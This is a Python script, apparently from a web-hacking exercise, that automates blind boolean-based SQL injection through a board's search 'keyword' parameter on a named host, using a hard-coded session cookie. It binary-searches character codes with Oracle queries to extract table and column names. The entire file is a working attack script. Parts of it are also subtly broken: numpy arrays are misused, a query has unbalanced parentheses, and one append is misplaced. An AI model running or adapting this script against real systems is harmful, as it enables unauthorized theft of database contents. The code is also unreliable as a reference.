import requests
import numpy as np
u = "https://elms1.skinfosec.co.kr:8082/community6/free"
h = {
    "Content-Type": "application/x-www-form-urlencoded"
}
c = {
    "JSESSIONID":"02C268957006D57669C15EFD7EA86632"
}
d = {
    "startDt":"",
    "endDt":"",
    "searchType":"all",
    "keyword":"EQST%' and (공격쿼리) and '1%'='1"
}

def binarySearch(query):
    start = 1
    end  = 127
    while start < end:
        mid = int((start + end) / 2)        
        
        keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
        d["keyword"] = keyword        
        r = requests.post(url=u, headers=h, cookies=c, data=d)
        if '결과가 없습니다.' in r.text:            
            end = mid           
        else:             
            start = mid + 1
    return end


# ================================
#        모든 테이블에 대한
#         컬럼 정보 구하기
# ================================
table_name_list= np.array()
col_name_list= np.array()

# 테이블 개수를 구하는 함수
def get_table_count():
    query = f"(select count(table_name) from user_tables)"
    table_count = binarySearch(query)
    return table_count

# 테이블 이름을 구하는 함수
def get_table_name(table_count) :
    for nth_table in range(1,table_count+1):
        get_table_name_length_query = f"(select length(table_name) from (select table_name, rownum r from user_tables) where r={nth_table})"
        nth_table_length = binarySearch(get_table_name_length_query)

        table_name=""
        for substr in range(1, nth_table_length+1):
            get_table_substr_query=f"(select ascii(substr((table_name),{substr},1)) from (select table_name, rownum r from user_tables) where r={nth_table})"
            table_substr = binarySearch(get_table_substr_query)
            table_name += chr(table_substr)

        # table_name_list 리스트에 이름을 저장한다.
        table_name_list.append(table_name)
        # !!!!테스트용!!!!
        print(table_name_list)


def get_column_count(table_name):
    query = f"(select count(table_name) from user_tables)"
    query = f"(select count(cname) from col where tname='{table_name}')"
    col_count = binarySearch(query)

    return col_count


def get_coloumn_name(column_count, table_name) :
    for nth_col in range (1, column_count+1):
    # nth_col번째 컬럼의 이름 길이 구하기
        col_count_query = f"select length(cname) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col})"
        col_length = binarySearch(col_count_query)

        col_name=""
        for substr in range(1, col_length+1):
            col_name_query = f"ascii((select substr(cname,{substr},1) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col}))"
            col_name += chr(binarySearch(col_name_query))

            col_name_list.append(col_name)
            print(col_name_list)
